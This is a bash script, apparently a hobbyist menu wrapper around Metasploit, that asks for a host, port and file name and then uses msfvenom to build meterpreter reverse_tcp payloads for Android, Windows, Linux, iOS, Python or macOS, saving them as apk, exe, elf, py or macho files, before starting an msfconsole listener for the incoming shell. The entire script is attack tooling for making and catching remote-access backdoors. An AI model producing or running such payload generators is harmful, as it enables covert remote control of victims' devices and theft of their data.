clear

#This is Blod color
green='\e[1;32m'
cyan='\e[1;36m'
red='\e[1;31m'
blue='\e[1;34m'
white='\e[1;37m'
yellow='\e[1;33m'
purple='\e[1;35m'
####################################
figlet "Welcome" | lolcat
################################ sinup
	echo -e $red"Telegram"$purple" https://t.me/x0f_3b"
	echo -e $red"Enter "$blue"Your "$green"Name:"
read v
	echo -e $green"Welcome "$v
################################## pas
sleep 2
######################################

	echo -e $red "Welcome to the metasploit tool"
clear

figlet " Hi Dear" $v | lolcat

####################################
echo -e $red
echo "███╗   ███╗███████╗████████╗ █████╗ ███████╗██████╗ ██╗      ██████╗ ██╗████████╗";
echo "████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝";
echo "██╔████╔██║█████╗     ██║   ███████║███████╗██████╔╝██║     ██║   ██║██║   ██║   ";
echo "██║╚██╔╝██║██╔══╝     ██║   ██╔══██║╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   ";
echo "██║ ╚═╝ ██║███████╗   ██║   ██║  ██║███████║██║     ███████╗╚██████╔╝██║   ██║   ";
echo "╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ";
echo "                                                                                 ";
echo
echo -e $red"1-"$cyan" Payload Android:"
echo
echo -e $red"2-"$cyan" Payload Windows:"
echo
echo -e $red"3-"$cyan" Payload Linux:"
echo
echo -e $red"4-"$cyan" Payload Ios:"
echo
echo -e $red"5-"$cyan" Payload Python:"
echo
echo -e $red"6-"$cyan" Payload Mac:"
echo
echo -e $red"0-"$cyan" Exit:"$blue""
echo
read -p "Enter the Number: " payload
############################
if [ $payload = 0 ]
then
clear
figlet "im sad ):" |lolcat
exit
fi

if [ $payload = 1 ]
then
echo
read -p "Set The Host>> " host
read -p "Set The Port>> " port
read -p "Set the Name>> " name
msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > /root/Desktop/$name.apk
msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp'
fi
if [ $payload = 2 ]
then
echo
read -p "Set The Host>> " host
read -p "Set The Port>> " port
read -p "Set the Name>> " name
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f exe -o /root/Desktop/$name.exe
msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp'
fi
if [ $payload = 3 ]
then
echo
read -p "Set The Host: " host
read -p "Set The Port: " port
read -p "set the Name: " name
msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$host LPORT=$port -o /root/Desktop/$name.elf
msfconsole -x 'use exploit/multi/handler' -x 'set payload linux/x86/meterpreter/reverse_tcp'
fi
if [ $payload = 4 ]
then
echo
read -p "Set The Host: " host
read -p "Set The Port: " port
read -p "Set the Name: " name
msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -o /root/Desktop/$name.api
msfconsole -x 'use exploit/multi/handler' -x 'set payload apple_ios/aarch64/meterpreter_reverse_tcp'
fi
if [ $payload = 5 ]
then
echo
read -p "Set The Host: " host
read -p "Set The Port: " port
read -p "Set the Name: " name
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> /root/Desktop/$name.py
msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp'
fi
if [ $payload = 6 ]
then
echo
read -p "Set The Host: " host
read -p "Set The Port: " port
read -p "Set the Name: " name
msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$host LPORT=$port -o /root/Desktop/$name.macho
msfconsole -x 'use exploit/multi/handler' -x 'set payload osx/x64/meterpreter_reverse_tcp'
fi
